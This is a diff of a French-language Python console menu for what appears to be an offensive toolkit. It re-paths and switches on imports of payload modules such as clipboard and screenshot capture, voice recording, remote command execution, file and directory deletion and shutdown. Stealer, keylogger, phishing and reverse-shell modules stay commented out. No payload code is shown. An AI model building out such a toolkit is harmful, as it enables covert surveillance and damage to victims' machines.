@@ -1,31 +1,29 @@
 from colorama import Fore, Style
 import os 
-from modules.payload.clipboard import clipboard_module
-from modules.payload.screenshot import screenshot_module
-#from modules.payload.dirlist import directory_listing_module
-#from modules.payload.filegrab import file_grabber_module
-#from modules.payload.keybcontrol import keyboard_controller_module
-#from modules.payload.networkinfo import network_info_module
-from modules.payload.openurl import open_url_module
-#from modules.payload.porthammer import port_hammer_module
-#from modules.payload.processview import process_view_module
-#from modules.payload.restart import restart_pc_module
-#from modules.payload.reversehttp import reverse_http_module
-#from modules.payload.reverseshell import reverse_shell_module
-#from modules.payload.rmdir import remove_directory_module
-#from modules.payload.rmscript import remove_file_module
-from modules.payload.runcmd import runcmd_module
-from modules.payload.shutdown import shutdown_module
-#from modules.payload.steal import stealer_module
-#from modules.payload.voicerec import voice_record_module
-#from modules.payload.wallpaper import change_wallpaper_module
-#from modules.payload.wifissid import wifi_ssid_module
-#from modules.capture.phishing import phishing_module
-#from modules.capture.keylogger import keylogger_module
-##from modules.scanner.vulnerabilityscanner import vulnerability_scanner_module
-#from modules.scanner.IPscan import network_scanner_module
-#from modules.scanner.dirscan import directory_scanner_module
-#from modules.scanner.localscan import localhost_scanner_module
+from Option.modules.payload.clipboard import clipboard_module
+from Option.modules.payload.screenshot import screenshot_module
+from Option.modules.payload.dirlist import *
+#from Option.modules.payload.filegrab import file_grabber_module
+#from Option.modules.payload.keybcontrol import keyboard_controller_module
+from Option.modules.payload.networkinfo import *
+from Option.modules.payload.openurl import open_url_module
+#from Option.modules.payload.porthammer import port_hammer_module
+#from Option.modules.payload.processview import process_view_module
+#from Option.modules.payload.reversehttp import reverse_http_module
+#from Option.modules.payload.reverseshell import reverse_shell_module
+from Option.modules.payload.rmdir import *
+from Option.modules.payload.rmscript import *
+from Option.modules.payload.runcmd import runcmd_module
+from Option.modules.payload.shutdown import shutdown_module
+#from Option.modules.payload.steal import stealer_module
+from Option.modules.payload.voicerec import *
+from Option.modules.payload.wallpaper import *
+#from Option.modules.capture.phishing import phishing_module
+#from Option.modules.capture.keylogger import keylogger_module
+#from Option.modules.scanner.vulnerabilityscanner import vulnerability_scanner_module
+#from Option.modules.scanner.IPscan import network_scanner_module
+#from Option.modules.scanner.dirscan import directory_scanner_module
+#from Option.modules.scanner.localscan import localhost_scanner_module
 
 
 
@@ -107,7 +105,7 @@ Appuyez sur Entrée pour continuer...
             print(Fore.CYAN + "\n=== Console Interactive ===\n")
             print(Fore.YELLOW + "Entrez 'payload' ou 'capture' ou 'scan' pour accéder aux modules correspondants.")
             continue
-        if cmd.lower() == "payload":
+        elif cmd.lower() == "payload":
             clear()
             print(f"""{Fore.CYAN}=== Modules Payload ==={Style.RESET_ALL}
 
@@ -207,3 +205,4 @@ Appuyez sur Entrée pour continuer...
             break
         else:
             print(Fore.RED + "Commande inconnue. Veuillez entrer 'payload', 'capture', 'scan' ou 'exit'." + Style.RESET_ALL)
+
